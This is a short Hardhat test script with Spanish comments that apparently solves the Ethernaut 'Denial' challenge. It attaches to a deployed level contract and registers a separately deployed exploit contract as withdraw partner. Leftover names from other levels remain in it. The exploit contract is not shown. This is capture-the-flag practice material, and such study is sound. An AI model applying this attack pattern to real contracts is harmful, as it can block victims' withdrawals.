import { assert } from "chai";
import { ethers } from "hardhat";

describe("Executing", function () {
  it("PreservationAttacker debe tomar ownership", async function () {

    // Deploy contracts
    //const gatekeeperContract = await (await ethers.getContractFactory("GatekeeperOne")).deploy();
    //const hackGatekeeperContract = await (await ethers.getContractFactory("HackGatekeeperOne")).deploy();
    //await Promise.all([gatekeeperContract, hackGatekeeperContract].map((contract) => contract.deployed()));

    // Attach to contracts
    const toa='0xccD621D8B61C5859BEca5E89E098d49957fe8F5A' //direccion contrato ethernaut gate instanciado
    const ethernautContract = await (await ethers.getContractFactory("Denial")).attach(toa);

    const toa2='0xEd6C830E73312f3E75001D97d5351D0fD3d90A50'; //direccion contrato exploit
    
    //Llamamos al contrato ethernaut y hacemos partner al exploit
    await ethernautContract.setWithdrawPartner(toa2); 
  });
});